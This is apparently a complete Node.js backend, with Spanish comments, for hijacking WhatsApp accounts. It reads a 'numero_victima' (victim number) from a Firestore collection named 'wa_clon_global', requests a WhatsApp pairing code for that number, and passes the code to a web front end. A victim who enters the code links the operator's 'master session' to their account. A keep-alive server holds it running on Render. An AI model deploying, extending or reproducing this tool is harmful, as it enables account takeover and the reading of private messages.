const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// Función optimizada para generar el código de 8 dígitos
async function generarCodigo(snap) {
    if (!snap.exists) return;
    const data = snap.data();
    
    // Solo actuamos si el status es 'solicitando_codigo' y NO hay código aún
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("PROCESANDO NÚMERO: " + data.numero_victima);
        try {
            // Pedimos el pairing code a WhatsApp
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("ÉXITO - CÓDIGO: " + code);
            
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log("FALLO: " + err.message);
            // Si falla, le avisamos a la web para que el usuario reintente
            await snap.ref.update({ status: "error" });
        }
    }
}

// Escuchar cambios en tiempo real
db.collection("wa_clon_global").doc("current_session").onSnapshot(generarCodigo);

client.on('ready', () => {
    console.log("MASTER SESSION ONLINE");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

// Arrancar WhatsApp
client.initialize().catch(e => console.log("Error Init:", e));

// Servidor de salud para que Render no apague el robot
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.end('ROBOT ACTIVE');
}).listen(port, () => {
    console.log("Servidor iniciado en puerto " + port);
});
